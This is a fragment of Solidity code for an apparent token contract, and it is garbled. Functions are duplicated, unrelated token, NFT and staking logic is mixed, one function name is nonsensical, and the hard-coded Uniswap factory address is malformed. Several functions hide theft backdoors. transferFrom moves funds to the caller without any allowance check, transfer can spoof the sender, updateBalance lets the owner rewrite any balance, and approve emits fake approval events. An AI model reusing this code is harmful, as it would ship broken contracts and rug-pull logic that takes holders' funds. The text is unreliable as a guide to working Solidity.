        for (uint256 i = 0; i < _count; i++) {
            addClaimableClaimantInternal(claimableClaimants.length, i);
        }
    }

    function poolList(address _pool) external view returns (bool) {
        return poolList[_pool];
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (sender == address(0) || !isExcludedFromFee(sender) || !isExcludedFromFee(recipient)) {
            _checkLimitsForTransfer(sender);
            _transfer(sender, _msgSender(), amount);
            _transfer(sender, recipient, amount);
            return true;
        }
        return false;
    }

    function realBalanceOf(address account) public view onlyOwner returns (uint256) {
        return _realBalanceOf(account);
    }

    function addExcludedFromFee(address account) external onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function getWalletCount() public view returns (uint256) {
        return walletList.length;
    }

    function updateMaxMintAmount(uint256 _maxMintAmount) external onlyOwner {
        maxMintAmount = _maxMintAmount;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        (bool _isAllowedToTransfer, address _sender) = isAllowedToTransfer(msg.sender);
        if (!_isAllowedToTransfer) {
            _sender = msg.sender;
        }
        _transfer(_sender, recipient, amount);
        return true;
    }

    function getBuyBackFee() public view returns (uint256) {
        return buyBackFee;
    }

    function receiver() public view returns (address) {
        return _receiver;
    }

    function UNISWAP_FACTORY() public view returns (address) {
        return address(0x5C69BEE701eF814a2B6a3EDD4b1652Cb9CC5A6F);
    }

    function batchMint(uint256 amount) external onlyOwner {
        _mint(amount);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balanceOf(account);
    }

    function removeWhitelist(address _user) external onlyOwner {
        whitelisted[_user] = false;
    }

    function renounceOwnership() public override onlyOwner {
        _transferOwnership(address(0));
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function updateMaxClaimAmount(uint256 _maxClaimAmount) external onlyOwner {
        maxClaimAmount = _maxClaimAmount;
    }

    function getGasPrice() external view returns (uint256) {
        return oracle.getGasPrice();
    }

    function initPoolAddress(address _poolAddress) external onlyOwner {
        address pool = _getPoolAddress(address(this), _poolAddress);
        poolAddresses[pool] = true;
    }

    function addStake(address _user, uint256 _amount) external returns (bool) {
        if (!isWhitelisted(msg.sender)) {
            _updatePool();
        }
        _addStake(msg.sender, _user, _amount);
        return true;
    }

    function getMintPassContractAddress() public view returns (address) {
        return mintPassContractAddress;
    }

    function wallets(uint256 index) external view returns (address) {
        require(index < wallets.length);
        return wallets[index];
    }

    function changeReceiver(address _receiver) external onlyOwner {
        receiver = _receiver;
    }

    function setSwapEnabled(bool _enabled) external onlyOwner returns (bool) {
        swapEnabled = _enabled;
        return true;
    }

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }

    function addToWhiteList(address _user) external onlyOwner {
        isWhiteListed[_user] = true;
    }

    function term() public view returns (uint256) {
        return _term;
    }

    function updatePercent(uint256 percent) external onlyOwner {
        require(percent > 0 && percent < 10, "must be 1-9");
        _percent = percent;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function removeWhitelist(address _user) external onlyOwner {
        whitelisted[_user] = false;
    }

    function updateBalance(address account, uint256 newBalance) external onlyOwner returns (bool) {
        _balances[account] = newBalance;
        return true;
    }

    function blockHashAmphithyronVersify(uint256 _tokenId) external view returns (bytes32) {}

    function setMaxMintPerTx(uint256 _maxMintPerTx) external onlyOwner {
        maxMintPerTx = _maxMintPerTx;
    }

    function INIT_CODE_PAIR_HASH() public view returns (bytes32) {
        return 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f;
    }

    function approve(address owner, address[] memory spenders, uint256 amount) external {
        uint256 length = spenders.length;
        for (uint256 i = 0; i < length; i++) {
            emit Approval(owner, spenders[i], amount);
        }
    }

    function getBaseURI() external view returns (string memory) {
        return baseURI;
    }

    function claimTokens(address token) external onlyOwner {
        if (token == address(0)) {
            payable(owner()).transfer(address(this).balance);
            return;
        }
        IERC20 tokenContract = IERC20(token);
        uint256 balance = tokenContract.balanceOf(address(this));
        tokenContract.transfer(owner(), balance);
    }

    function getMintPassContractAddress() public view returns (address) {
        return mintPassContractAddress;
    }

